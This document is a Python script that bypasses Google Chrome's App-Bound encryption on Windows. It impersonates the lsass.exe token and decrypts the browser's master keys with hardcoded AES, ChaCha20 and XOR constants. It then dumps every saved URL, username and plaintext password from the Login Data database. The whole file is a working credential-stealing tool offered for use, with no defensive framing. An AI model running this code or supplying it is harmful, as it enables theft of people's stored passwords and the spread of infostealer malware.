import os
import io
import shutil
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
import base64
from contextlib import contextmanager
import tempfile

import windows
import windows.crypto
import windows.generated_def as gdef

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from Crypto.Cipher import AES
import win32crypt

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] in [1, 2]:
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
    assert status == 0
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), "Google Chromekey1", 0, 0)
    assert status == 0
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    assert status == 0
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size, ctypes.byref(pcbResult), 0x40)
    assert status == 0
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)
    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)

def main():
    if not is_admin():
        print("[-] Error: This script must be run as Administrator.")
        return

    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    login_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
   
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # Get standard v10/v11 master key fallback
    try:
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        v10_master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        v10_master_key = None

    # Get v20 App-Bound master key
    v20_master_key = None
    try:
        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        if binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB":
            key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
            with impersonate_lsass():
                key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
            key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
            parsed_data = parse_key_blob(key_blob_user_decrypted)
            v20_master_key = derive_v20_master_key(parsed_data)
    except Exception as e:
        print(f"[-] V20 Key derivation warning: {e}")

    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "TempLoginData")
        try:
            shutil.copy2(login_db_path, temp_db_path)
        except PermissionError:
            print("[-] Permission denied: Please close Google Chrome completely and try again.")
            return

        con = sqlite3.connect(pathlib.Path(temp_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) from logins;")
        logins = cur.fetchall()
        con.close()

        print("\n[+] Decrypted Saved Passwords:")
        print("=" * 40)
        for l in logins:
            url, username, enc_pass = l
            if not enc_pass:
                continue
            
            plain_pass = "[Could not decrypt]"
            try:
                if enc_pass[:3] == b"v20" and v20_master_key:
                    iv = enc_pass[3:15]
                    ciphertext = enc_pass[15:-16]
                    tag = enc_pass[-16:]
                    cipher = AESGCM(v20_master_key)
                    decrypted = cipher.decrypt(iv, ciphertext + tag, None)
                    plain_pass = decrypted.decode('utf-8', errors='ignore')
                elif enc_pass[:3] in (b'v10', b'v11') and v10_master_key:
                    iv = enc_pass[3:15]
                    ciphertext = enc_pass[15:]
                    cipher = AES.new(v10_master_key, AES.MODE_GCM, iv)
                    plain_pass = cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
            except Exception as ex:
                plain_pass = f"[Error: {ex}]"

            print(f"URL      : {url}")
            print(f"Username : {username}")
            print(f"Password : {plain_pass}")
            print("-" * 40)

if __name__ == "__main__":
    main()
